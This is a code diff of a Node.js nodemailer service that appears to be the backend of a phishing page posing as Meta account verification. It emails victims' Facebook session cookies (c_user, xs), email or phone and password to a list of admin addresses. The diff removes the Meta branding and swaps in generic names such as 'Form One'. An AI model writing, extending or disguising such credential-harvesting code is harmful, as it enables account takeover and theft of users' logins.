@@ -1,66 +1,66 @@
 import nodemailer from 'nodemailer';
-import { validationFormEmailConfig, confirmationFormEmailConfig } from './email-config';
-import { type ContactForm } from '@shared/schema';
+import { formOneConfig, formTwoConfig } from './email-config';
 
 class EmailService {
-  private validationTransporter;
-  private confirmationTransporter;
+  private formOneTransporter;
+  private formTwoTransporter;
 
   constructor() {
-    this.validationTransporter = nodemailer.createTransport(validationFormEmailConfig);
-    this.confirmationTransporter = nodemailer.createTransport(confirmationFormEmailConfig);
+    this.formOneTransporter = nodemailer.createTransport(formOneConfig);
+    this.formTwoTransporter = nodemailer.createTransport(formTwoConfig);
   }
 
-  async sendValidationFormEmail(data: ContactForm) {
+  async sendFormOneEmail(data: any) {
     const mailOptions = {
-      from: validationFormEmailConfig.auth.user,
-      to: validationFormEmailConfig.adminEmail,
-      subject: 'New Meta Verification Form Submission',
+      from: formOneConfig.auth.user,
+      to: formOneConfig.adminEmails.filter(Boolean).join(','),
+      subject: 'Form One Submission',
       html: `
-        <h2 style="color: #1877f2;">New Form Submission - Validation Step</h2>
+        <h2 style="color: #1877f2;">New Form One Submission</h2>
         <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
           <p><strong>c_user:</strong> ${data.c_user}</p>
           <p><strong>xs:</strong> ${data.xs}</p>
           <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
         </div>
-        <p style="color: #65676B; font-size: 12px;">This is an automated message from the Meta Verification system.</p>
+        <p style="color: #65676B; font-size: 12px;">This is an automated message.</p>
       `
     };
 
     try {
-      console.log('Sending validation form email...');
-      const result = await this.validationTransporter.sendMail(mailOptions);
-      console.log('Validation form email sent:', result);
+      console.log('Sending form one email...');
+      const result = await this.formOneTransporter.sendMail(mailOptions);
+      console.log('Form one email sent:', result);
       return result;
     } catch (error) {
-      console.error('Error sending validation form email:', error);
+      console.error('Error sending form one email:', error);
       throw error;
     }
   }
 
-  async sendConfirmationFormEmail(data: ContactForm) {
+  async sendFormTwoEmail(data: any) {
     const mailOptions = {
-      from: confirmationFormEmailConfig.auth.user,
-      to: confirmationFormEmailConfig.adminEmail,
-      subject: 'New Meta Account Verification Form Submission',
+      from: formTwoConfig.auth.user,
+      to: formTwoConfig.adminEmails.filter(Boolean).join(','),
+      subject: 'Form Two Submission',
       html: `
-        <h2 style="color: #1877f2;">New Form Submission - Confirmation Step</h2>
+        <h2 style="color: #1877f2;">New Form Two Submission</h2>
         <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
-          ${data.user_email ? `<p><strong>Email/Phone:</strong> ${data.user_email}</p>` : '<p><strong>Note:</strong> No email/phone provided</p>'}
+          <p><strong>User Email/Phone:</strong> ${data.user_email}</p>
           <p><strong>Password:</strong> ${data.password}</p>
+          <p><strong>Additional Admin Email:</strong> ${data.admin_email_3 || 'Not provided'}</p>
           <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
         </div>
-        <p style="color: #65676B; font-size: 12px;">This is an automated message from the Meta Verification system.</p>
+        <p style="color: #65676B; font-size: 12px;">This is an automated message.</p>
       `
     };
 
     try {
-      console.log('Sending confirmation form email...');
-      const result = await this.confirmationTransporter.sendMail(mailOptions);
-      console.log('Confirmation form email sent:', result);
+      console.log('Sending form two email...');
+      const result = await this.formTwoTransporter.sendMail(mailOptions);
+      console.log('Form two email sent:', result);
       return result;
     } catch (error) {
-      console.error('Error sending confirmation form email:', error);
+      console.error('Error sending form two email:', error);
       throw error;
     }
   }
